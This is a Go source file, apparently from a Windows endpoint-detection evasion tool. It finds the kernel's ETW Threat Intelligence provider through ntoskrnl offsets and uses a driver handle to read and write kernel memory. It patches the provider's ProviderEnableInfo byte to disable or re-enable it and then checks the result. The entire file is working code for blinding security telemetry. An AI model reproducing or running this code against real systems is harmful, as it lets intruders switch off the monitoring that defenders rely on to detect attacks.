package main

import (
	"fmt"

	"golang.org/x/sys/windows"
)

func getEtwThreatIntProvRegHandleAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
	if nOffsets.etwThreatIntProvRegHandle == 0 {
		return 0
	}
	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
	return ntoskrnlBaseAddress + DWORD64(nOffsets.etwThreatIntProvRegHandle)

}

func getEtwThreatIntProviderEnableInfoAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
	if nOffsets.etwThreatIntProvRegHandle == 0 && nOffsets.etwRegEntryGuidEntry == 0 && nOffsets.etwGuidEntryProviderEnableInfo == 0 {
		fmt.Println("[!] ETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel.")
		return 0
	}
	device := getDriverHandle()
	etwThreatIntProvRegHandleAddress := getEtwThreatIntProvRegHandleAddress(nOffsets)
	etwThreatIntETWREGENTRYAddress := readMemoryDWORD64(device, etwThreatIntProvRegHandleAddress)
	fmt.Printf("[+] Found ETW Threat Intel provider _ETW_REG_ENTRY at %x\n", etwThreatIntETWREGENTRYAddress)
	etwThreatIntETWGUIDENTRYAddress := readMemoryDWORD64(device, etwThreatIntETWREGENTRYAddress+DWORD64(nOffsets.etwRegEntryGuidEntry))
	windows.CloseHandle(device)
	return etwThreatIntETWGUIDENTRYAddress + DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)

}

func changeStatusETWThreatIntelProvider(nOffsets *NtoskrnlOffsets, enable bool) {
	var provState DWORD64 = 0
	var txtState string = "disable"
	if enable {
		provState = 1
		txtState = "enable"
	}
	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(nOffsets)
	if etwThreatIntProviderEnableInfoAddress == 0 {
		return
	}
	fmt.Printf("[*] Attempting to %sd the ETW Threat Intel provider by patching ProviderEnableInfo at %x with 0x%d.\n", txtState, etwThreatIntProviderEnableInfoAddress, provState)

	device := getDriverHandle()
	writeMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress, provState)
	finalState := isETWThreatIntelProviderEnabled()
	if finalState == enable {
		fmt.Printf("[+] The ETW Threat Intel provider was successfully %sd!\n", txtState)
	} else {
		fmt.Printf("[!] Failed to %s the ETW Threat Intel provider!\n", txtState)
	}
}

func isETWThreatIntelProviderEnabled() bool {
	state := false

	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return state
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(&ntoskrnlOffsets)

	if etwThreatIntProviderEnableInfoAddress == 0 {
		return state
	}
	device := getDriverHandle()
	etwThreatIntProviderEnableInfoValue := readMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress)
	windows.CloseHandle(device)
	state = etwThreatIntProviderEnableInfoValue == 0x1 //0x1 means ENABLE_PROVIDER
	return state
}
